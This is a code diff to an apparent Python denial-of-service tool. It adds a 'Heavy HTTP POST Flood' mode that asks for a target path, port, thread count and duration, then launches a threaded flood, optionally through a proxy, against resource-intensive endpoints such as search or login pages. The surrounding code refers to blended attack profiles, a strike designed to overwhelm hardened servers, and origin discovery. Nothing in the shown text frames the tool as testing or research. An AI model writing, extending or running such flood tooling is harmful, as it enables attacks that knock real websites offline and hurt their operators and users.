@@ -15,6 +15,56 @@ def launch_attack_thread(target_func, args_tuple):
     return thread
 
 
+# --- NEW: HEAVY POST ATTACK ORCHESTRATOR ---
+def run_heavy_post_strike(target, use_proxy):
+    """
+    Orchestrator for the targeted Heavy HTTP POST Flood.
+    Prompts the user for specific attack parameters.
+    """
+    print("\n" + "=" * 60)
+    print("MODE: HEAVY HTTP POST FLOOD (APPLICATION LOGIC ATTACK)")
+    print("This attack is most effective when you target a known resource-intensive")
+    print("endpoint, such as a search function or form processor.")
+    print("=" * 60)
+
+    stop_event, pause_event = threading.Event(), threading.Event()
+
+    try:
+        # Get detailed parameters from the user
+        path = input("Enter the target path (e.g., /api/search or /login.php): ")
+        if not path.startswith('/'):
+            path = '/' + path
+
+        port = int(input("Enter target port (e.g., 80 or 443): "))
+        threads = int(input("Enter number of threads (e.g., 100): "))
+        duration = int(input("Enter attack duration in seconds (e.g., 120): "))
+
+        # Ask for optional POST data
+        post_data = input("Enter specific POST data (optional, press Enter to use random data): ")
+
+    except ValueError:
+        print("[!] Invalid input. Please enter numbers where required.")
+        return
+
+    print(f"\n[+] Launching Heavy POST flood on {target}:{port}{path}...")
+    if use_proxy: print("[PROXY] Attack will be routed through the proxy.")
+
+    attack_thread = threading.Thread(
+        target=counter_strike_helper.attack_heavy_http_post,
+        args=(target, path, port, post_data, duration, stop_event, pause_event, threads, use_proxy)
+    )
+
+    attack_thread.start()
+    try:
+        attack_thread.join()
+        print("\n[+] Heavy POST flood has completed its duration.")
+    except KeyboardInterrupt:
+        print("\n[!] Keyboard interrupt received. Signaling attack to stop...")
+        stop_event.set()
+        attack_thread.join(timeout=5)
+        print("\n[+] Attack stopped.")
+
+
 def level2_penetrator_strike(target, use_proxy, network_interface):
     """
     A specially designed profile to overwhelm a "Level 2" hardened server.
@@ -414,6 +464,7 @@ if __name__ == "__main__":
         Select an Action:
           1: Launch Blended Attack Profile
           2: Run Reconnaissance / Discovery
+          3: Launch Targeted Heavy POST Flood
 
         Please enter your option: """
         main_choice = int(input(main_menu_text))
@@ -456,6 +507,8 @@ if __name__ == "__main__":
                 run_origin_discovery(target_domain)
             else:
                 print("Invalid recon option.")
+        elif main_choice == 3:
+            run_heavy_post_strike(target_domain, proxy_enabled)
         else:
             print("Invalid category selected. Exiting.")
 
